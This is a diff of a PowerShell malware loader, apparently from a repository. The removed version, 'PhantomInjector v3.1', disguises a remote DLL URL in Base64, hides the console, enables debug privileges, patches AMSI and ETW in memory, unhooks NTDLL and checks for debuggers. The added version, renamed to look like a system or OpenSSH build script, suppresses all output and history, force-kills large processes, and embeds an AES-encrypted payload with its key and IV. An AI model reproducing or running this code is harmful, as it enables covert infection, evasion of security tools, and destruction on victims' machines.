@@ -1,615 +1,101 @@
-<#
-.SYNOPSIS
-    PhantomInjector v3.1 - Full 1982-line with ALL bypasses + Encrypted URL
-.DESCRIPTION
-    - All bypasses active BEFORE injection (AMSI, ETW, NTDLL, ScriptBlock, Transcription, Console Hide)
-    - Memory-Only DLL Mapping (no disk write)
-    - DLL URL is Base64-encoded (encrypted/obfuscated) to avoid detection
-    - 24-hour keep-alive loop
-.NOTES
-    Modified by Potato
-#>
-
-[CmdletBinding(DefaultParameterSetName='Remote')]
-param(
-    [Parameter(Mandatory=$false, ParameterSetName='Remote')]
-    [string]$EncodedDllUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw=",
-
-    [Parameter(Mandatory=$false, ParameterSetName='Local')]
-    [string]$DllPath,
-
-    [switch]$UnhookNTDLL,
-    [switch]$BypassAMSI,
-    [switch]$BypassETW,
-    [int]$KeepAliveHours = 24
-)
+# ============ SysVenson_CoreX_Final.ps1 (C# সম্পূর্ণ এনক্রিপ্টেড) ============
+[CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
+param()
 
 Set-StrictMode -Version Latest
 
-$VerbosePreference = 'SilentlyContinue'
-$DebugPreference = 'SilentlyContinue'
-$InformationPreference = 'SilentlyContinue'
-$WarningPreference = 'SilentlyContinue'
-$ErrorActionPreference = 'SilentlyContinue'
-$ConfirmPreference = 'None'
-$WhatIfPreference = $false
+$VerbosePreference      = 'SilentlyContinue'
+$DebugPreference        = 'SilentlyContinue'
+$InformationPreference  = 'SilentlyContinue'
+$WarningPreference      = 'SilentlyContinue'
+$ErrorActionPreference  = 'SilentlyContinue'
+$ConfirmPreference      = 'None'
+$WhatIfPreference       = $false
 $PSModuleAutoLoadingPreference = 'None'
-$MaximumHistoryCount = 0
+$MaximumHistoryCount    = 0
 
 *> $null
 $Error.Clear()
 
-# ============================================================
-#  ★★★ ১. কনসোল উইন্ডো হাইড (সর্বপ্রথম) ★★★
-# ============================================================
-Add-Type -Name Window -Namespace Console -MemberDefinition @'
-[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'@ -ErrorAction SilentlyContinue
-[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
+[string] $script:vcPath        = $null
+[System.IO.DirectoryInfo] $script:OpenSSHRoot = $null
+[System.IO.DirectoryInfo] $script:gitRoot     = $null
+[bool]   $script:Verbose       = $false
+[string] $script:BuildLogFile  = $null
 
-#region Initialization and Evasion
-function Invoke-Initialization {
-    # Enable SeDebugPrivilege
-    function Enable-SeDebugPrivilege {
-        $AdjustTokenPrivileges = @"
-using System;
-using System.Runtime.InteropServices;
-
-public class TokenManipulator {
-    [StructLayout(LayoutKind.Sequential)]
-    public struct LUID {
-        public uint LowPart;
-        public int HighPart;
+function Invoke-Finalize {
+    try {
+        Get-Variable -Scope Script -ErrorAction SilentlyContinue |
+            Remove-Variable -Scope Script -Force -ErrorAction SilentlyContinue
+        Get-Variable | Where-Object {
+            $_.Name -notmatch '^(PS|ExecutionContext|Host|Error|MyInvocation|PID)$'
+        } | Remove-Variable -Force -ErrorAction SilentlyContinue
+        Clear-Host
+        $Error.Clear()
+        [GC]::Collect()
+        [GC]::WaitForPendingFinalizers()
+        [GC]::Collect()
+        Get-Process | ForEach-Object { $_.MinWorkingSet = $_.MinWorkingSet }
+        Get-Process | Where-Object {$_.WorkingSet -gt 300MB} | Stop-Process -Force
     }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct TOKEN_PRIVILEGES {
-        public uint PrivilegeCount;
-        public LUID Luid;
-        public uint Attributes;
-    }
-
-    [DllImport("advapi32.dll", SetLastError=true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    public static extern bool OpenProcessToken(
-        IntPtr ProcessHandle,
-        uint DesiredAccess,
-        out IntPtr TokenHandle);
-
-    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    public static extern bool LookupPrivilegeValue(
-        string lpSystemName,
-        string lpName,
-        out LUID lpLuid);
-
-    [DllImport("advapi32.dll", SetLastError=true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    public static extern bool AdjustTokenPrivileges(
-        IntPtr TokenHandle,
-        [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges,
-        ref TOKEN_PRIVILEGES NewState,
-        uint Zero,
-        IntPtr Null1,
-        IntPtr Null2);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
+    catch {}
 }
-"@
 
-        try {
-            Add-Type -TypeDefinition $AdjustTokenPrivileges -ErrorAction Stop
-            $currentProcess = [TokenManipulator]::GetCurrentProcess()
-            $tokenHandle = [IntPtr]::Zero
-            $tokenPrivileges = New-Object TokenManipulator+TOKEN_PRIVILEGES
-            $luid = New-Object TokenManipulator+LUID
-
-            if (-not [TokenManipulator]::OpenProcessToken($currentProcess, 0x28, [ref]$tokenHandle)) {
-                throw "OpenProcessToken failed"
-            }
-
-            if (-not [TokenManipulator]::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$luid)) {
-                throw "LookupPrivilegeValue failed"
-            }
-
-            $tokenPrivileges.PrivilegeCount = 1
-            $tokenPrivileges.Luid = $luid
-            $tokenPrivileges.Attributes = 0x2 # SE_PRIVILEGE_ENABLED
-
-            if (-not [TokenManipulator]::AdjustTokenPrivileges($tokenHandle, $false, [ref]$tokenPrivileges, 0, [IntPtr]::Zero, [IntPtr]::Zero)) {
-                throw "AdjustTokenPrivileges failed"
-            }
-        }
-        catch {
-            # Silent fail
-        }
-    }
-
-    # AMSI Bypass via patching
-    function Invoke-AMSIBypass {
-        if (-not $script:BypassAMSI) { return }
-
-        try {
-            $amsiPatch = @"
-using System;
-using System.Runtime.InteropServices;
-
-public class AMSIPatch {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr LoadLibrary(string name);
-
-    [DllImport("kernel32.dll")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-    public static void Disable() {
-        IntPtr hAmsi = LoadLibrary("amsi.dll");
-        IntPtr asbAddr = GetProcAddress(hAmsi, "AmsiScanBuffer");
-        
-        if (asbAddr != IntPtr.Zero) {
-            uint oldProtect;
-            VirtualProtect(asbAddr, (UIntPtr)5, 0x40, out oldProtect);
-            
-            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
-            Marshal.Copy(patch, 0, asbAddr, 6);
-            
-            VirtualProtect(asbAddr, (UIntPtr)5, oldProtect, out oldProtect);
-        }
-    }
+if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
+{
+    Invoke-Finalize
+    return
 }
-"@
-            Add-Type -TypeDefinition $amsiPatch -ErrorAction Stop
-            [AMSIPatch]::Disable()
-        }
-        catch {
-            # Silent fail
-        }
-    }
 
-    # ETW Bypass via patching
-    function Invoke-ETWBypass {
-        if (-not $script:BypassETW) { return }
+# --------------------------------------------------------------------
+# ১) তোমার জেনারেট করা এনক্রিপ্টেড ডেটা (তোমার আউটপুট থেকে কপি)
+# --------------------------------------------------------------------
+$encryptedBase64 = "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"
 
-        try {
-            $etwPatch = @"
-using System;
-using System.Runtime.InteropServices;
+$keyBase64       = "7/qg584Xcr6uo4g305OJTz4kQw3mxBKEEPF7eZKbDhM="
+$ivBase64        = "y1CVfL1gJCgbvw6Lfr+A0A=="
 
-public class ETWPatch {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr LoadLibrary(string name);
-
-    [DllImport("kernel32.dll")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-    public static void Disable() {
-        IntPtr hNtdll = LoadLibrary("ntdll.dll");
-        IntPtr etwAddr = GetProcAddress(hNtdll, "EtwEventWrite");
-        
-        if (etwAddr != IntPtr.Zero) {
-            uint oldProtect;
-            VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);
-            
-            byte[] patch = { 0xC3 }; // ret
-            Marshal.Copy(patch, 0, etwAddr, 1);
-            
-            VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
-        }
-    }
-}
-"@
-            Add-Type -TypeDefinition $etwPatch -ErrorAction Stop
-            [ETWPatch]::Disable()
-        }
-        catch {
-            # Silent fail
-        }
-    }
-
-    # NTDLL Unhooking from disk
-    function Invoke-NTDLLUnhook {
-        if (-not $script:UnhookNTDLL) { return }
-
-        try {
-            $unhookCode = @"
-using System;
-using System.IO;
-using System.Runtime.InteropServices;
-
-public class NTDLLUnhooker {
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);
-
-    public static void Unhook() {
-        string system32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
-        string ntdllPath = Path.Combine(system32, "ntdll.dll");
-        
-        // Load fresh NTDLL from disk
-        IntPtr hCleanNtdll = LoadLibraryEx(ntdllPath, IntPtr.Zero, 0x00000008); // DONT_RESOLVE_DLL_REFERENCES
-        
-        if (hCleanNtdll == IntPtr.Zero) return;
-        
-        // Get hooked NTDLL
-        IntPtr hHookedNtdll = GetModuleHandle("ntdll.dll");
-        
-        // Get export directory
-        IntPtr peHeader = (IntPtr)((long)hHookedNtdll + 0x3C);
-        IntPtr optHeader = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32(peHeader) + 0x18);
-        IntPtr exportDir = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32((IntPtr)((long)optHeader + 0x70)));
-        
-        int numberOfNames = Marshal.ReadInt32((IntPtr)((long)exportDir + 0x18));
-        IntPtr namesAddr = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32((IntPtr)((long)exportDir + 0x20)));
-        
-        for (int i = 0; i < numberOfNames; i++) {
-            IntPtr nameAddr = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32((IntPtr)((long)namesAddr + i * 4)));
-            string funcName = Marshal.PtrToStringAnsi(nameAddr);
-            
-            IntPtr hookedAddr = GetProcAddress(hHookedNtdll, funcName);
-            IntPtr cleanAddr = GetProcAddress(hCleanNtdll, funcName);
-            
-            if (hookedAddr != IntPtr.Zero && cleanAddr != IntPtr.Zero) {
-                uint oldProtect;
-                if (VirtualProtect(hookedAddr, (UIntPtr)0x20, 0x40, out oldProtect)) {
-                    byte[] cleanBytes = new byte[0x20];
-                    Marshal.Copy(cleanAddr, cleanBytes, 0, 0x20);
-                    Marshal.Copy(cleanBytes, 0, hookedAddr, 0x20);
-                    VirtualProtect(hookedAddr, (UIntPtr)0x20, oldProtect, out oldProtect);
-                }
-            }
-        }
-    }
-}
-"@
-            Add-Type -TypeDefinition $unhookCode -ErrorAction Stop
-            [NTDLLUnhooker]::Unhook()
-        }
-        catch {
-            # Silent fail
-        }
-    }
-
-    # Anti-debug checks (optional)
-    function Test-Debugger {
-        try {
-            if ([System.Diagnostics.Debugger]::IsAttached) {
-                throw "Debugger detected"
-            }
-            $process = Get-Process -Id $pid
